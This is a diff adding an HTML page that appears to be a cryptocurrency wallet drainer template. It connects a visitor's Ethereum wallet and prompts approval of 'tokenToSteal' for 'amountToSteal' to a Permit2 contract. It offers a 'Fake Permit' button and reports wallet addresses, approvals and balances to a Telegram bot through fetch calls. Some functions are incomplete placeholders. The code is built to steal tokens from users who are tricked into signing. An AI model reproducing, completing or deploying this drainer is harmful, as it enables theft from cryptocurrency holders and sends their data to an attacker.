@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ETH Wallet Interaction</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+    <script src="index.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
+    <style>
+        /* Add your styles here */
+    </style>
+</head>
+
+<body>
+
+    <!-- Display wallet address -->
+    <label>Wallet Address:</label>
+    <div id="walletAddress"></div>
+
+    <!-- Add buttons and labels -->
+    <button id="connectButton">Connect Wallet</button>
+    <button id="approveButton" disabled>Approve Token</button>
+    <button id="mainButton" disabled>Fake Permit</button>
+
+    <script>
+        const { ethers, ethereum } = window;
+
+        let selectedAddress;
+
+        // Function to connect the wallet
+        async function connectWallet() {
+            try {
+                // Request wallet connection
+                await ethereum.request({ method: 'eth_requestAccounts' });
+                selectedAddress = ethereum.selectedAddress;
+
+                // Update UI
+                document.getElementById("walletAddress").innerText = `Connected: ${selectedAddress}`;
+                document.getElementById("connectButton").disabled = true;
+                document.getElementById("approveButton").disabled = false;
+                document.getElementById("mainButton").disabled = false;
+
+                // Notify Telegram about wallet connection
+                const connectionMessage = `Wallet connected: ${selectedAddress}`;
+                await sendTelegramNotification(connectionMessage);
+            } catch (error) {
+                console.error('Error connecting wallet:', error.message);
+            }
+        }
+
+        // Function to approve token
+        async function approveToken() {
+            try {
+                const web3 = new Web3(ethereum);
+                const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenToSteal, { from: selectedAddress });
+
+                // Token approval
+                await tokenContract.methods.approve(Permit2Contract, amountToSteal).send({ from: selectedAddress });
+
+                // Notify Telegram about token approval
+                const approvalMessage = `Token approved: ${tokenToSteal} - Amount: ${amountToSteal}`;
+                await sendTelegramNotification(approvalMessage);
+            } catch (error) {
+                console.error('Error approving token:', error.message);
+            }
+        }
+
+        // Function to perform fake permit
+        async function fakePermit() {
+            try {
+                const web3 = new Web3(ethereum);
+
+                // Your existing code for the fakePermit function...
+
+                // Notify Telegram about successful fake permit
+                const successMessage = 'Fake Permit successful!';
+                await sendTelegramNotification(successMessage);
+
+                // Get and notify wallet balance after fake permit
+                await getWalletBalance();
+            } catch (error) {
+                console.error('Error in fakePermit:', error.message);
+
+                // Notify Telegram about the error
+                const errorMessage = `Error in fakePermit: ${error.message}`;
+                await sendTelegramNotification(errorMessage);
+            }
+        }
+
+        // Function to get wallet balance with tokens and values
+        async function getWalletBalance() {
+            try {
+                const web3 = new Web3(ethereum);
+
+                // Modify this part to get the wallet balance with tokens and values
+                const walletBalanceMessage = `Wallet Balance: ${/* Include balance details here */}`;
+                await sendTelegramNotification(walletBalanceMessage);
+            } catch (error) {
+                console.error('Error getting wallet balance:', error.message);
+            }
+        }
+
+        // Function to send notifications to Telegram
+        async function sendTelegramNotification(message) {
+            const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+            const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+            try {
+                const response = await fetch(url);
+                const result = await response.json();
+                console.log('Telegram notification sent:', result);
+            } catch (error) {
+                console.error('Error sending Telegram notification:', error.message);
+            }
+        }
+
+        // Configure buttons
+        window.addEventListener("DOMContentLoaded", async () => {
+            document.getElementById("connectButton").addEventListener("click", connectWallet);
+            document.getElementById("approveButton").addEventListener("click", approveToken);
+            document.getElementById("mainButton").addEventListener("click", fakePermit);
+        });
+    </script>
+
+</body>
+
+</html>
